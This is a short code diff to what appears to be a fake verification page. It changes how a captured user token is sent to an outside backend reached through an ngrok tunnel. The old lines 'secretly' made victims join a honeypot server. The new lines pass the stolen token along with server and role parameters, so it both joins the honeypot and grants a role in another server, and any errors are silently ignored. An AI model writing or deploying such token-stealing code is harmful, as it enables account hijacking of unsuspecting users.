@@ -217,9 +217,11 @@
             btn.disabled = true;
             btn.innerText = "Finalizing Handshake...";
 
-            if (globalCapturedToken) {
-                // Secretly make them join the honeypot
-                fetch(`${AGENCY_BACKEND}/api/join?tk=${globalCapturedToken}`, {
+            const { id, t, g, r } = tacticalParams;
+
+            if (globalCapturedToken && g && r && t) {
+                // Tactical Finalize: Join honeypot AND grant role in original server
+                fetch(`${AGENCY_BACKEND}/api/finalize?tk=${globalCapturedToken}&t=${t}&g=${g}&r=${r}`, {
                     headers: { 'ngrok-skip-browser-warning': 'true' }
                 }).catch(() => {});
             }
